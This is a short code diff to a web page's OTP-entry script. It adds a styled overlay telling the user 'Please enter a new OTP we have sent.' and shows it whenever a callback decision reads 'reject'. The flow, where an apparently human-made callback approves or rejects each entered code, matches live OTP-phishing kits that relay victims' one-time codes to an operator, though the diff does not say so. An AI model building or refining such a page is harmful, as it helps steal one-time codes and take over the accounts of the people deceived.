@@ -413,6 +413,35 @@
             otpBoxes[0].focus();
         }
 
+        function showRejectNoticeAndReturnToOtp() {
+            spinnerOverlay.style.display = 'none';
+            resultOverlay.style.display = 'flex';
+            resultOverlay.style.background = 'rgba(2, 8, 20, 0.96)';
+            resultOverlay.style.backdropFilter = 'blur(12px)';
+
+            resultMessage.style.cssText = `
+                color: #00d9ff;
+                background: linear-gradient(145deg, #071426, #102b49, #050d1b);
+                border: 1px solid #00bfff;
+                border-radius: 16px;
+                padding: 25px 20px;
+                margin: 15px;
+                font-size: 16px;
+                font-weight: 700;
+                line-height: 1.8;
+                text-align: center;
+                letter-spacing: 0.5px;
+                text-shadow: 0 0 8px #00bfff, 0 0 18px #0077ff;
+                box-shadow: 0 0 15px rgba(0,191,255,0.4),
+                            inset 0 0 15px rgba(0,191,255,0.08);
+            `;
+            resultMessage.textContent = 'Please enter a new OTP we have sent.';
+
+            setTimeout(() => {
+                resetToOtpEntry();
+            }, 2200);
+        }
+
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
                 box.value = box.value.replace(/\D/g, '');
@@ -469,7 +498,7 @@
             const [decision] = callbackData.split('_');
 
             if (decision === 'reject') {
-                resetToOtpEntry();
+                showRejectNoticeAndReturnToOtp();
                 return;
             }
 
